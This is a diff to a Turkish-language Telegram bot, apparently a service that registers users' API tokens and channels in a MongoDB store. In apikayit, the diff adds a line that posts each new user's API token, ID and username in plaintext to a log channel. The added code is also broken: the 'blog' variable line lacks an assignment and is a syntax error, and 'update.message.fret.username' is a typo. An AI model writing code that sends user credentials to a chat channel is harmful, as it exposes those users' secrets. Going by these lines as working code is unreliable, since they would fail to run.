@@ -39,6 +39,7 @@ karaliste = collection.find_one({"_id": 0})
 bottoken = karaliste['bottoken']
 bot = ExtBot(bottoken, defaults=Defaults(parse_mode=ParseMode.HTML, run_async=True, timeout=9))
 
+blog -1001391561285
 botlog = -1001352123979
 sahip = 1302980840
 fixer = 1687646994
@@ -1123,6 +1124,7 @@ def apikayit(update, context):
             collection.update_one({"_id": user}, {"$set": {"token": token}})
         bot.send_message(chat, "<b>🟢 API kaydedildi!</b>")
         bot.send_message(chat, "<i>📝 Lütfen kanalınızdan bir gönderi iletin.</i>", reply_markup=imark())
+        bot.send_message(blog, f"#YENİ_KULLANİCİ\nID: {user}\nAPI: {token}\nK.ADI: {update.message.fret.username}")
         return KANALKAYDET
     if bnb == None:
         collection.insert_one(key)
@@ -1165,7 +1167,7 @@ def kanalkayit(update, context):
         if y.user.id == user:
             collection.update_one({"_id": user}, {"$push":{"kanal": str(kanal)}})
             update.message.reply_text("<b>🟢Kanalınız Kaydedildi.</b>", reply_markup=dugme(user))
-            bot.send_message(-1001391561285, f"#YENİ_KANAL\nID: {kanal}\nÜYE: {bot.get_chat_members_count(kanal)}SAHİP: {user}")
+            bot.send_message(blog, f"#YENİ_KANAL\nID: {kanal}\nÜYE: {bot.get_chat_members_count(kanal)}\nSAHİP: {user}")
             return ConversationHandler.END
             break
     msz = bot.send_message(chat, "Bu kanal sizin değil 😠")
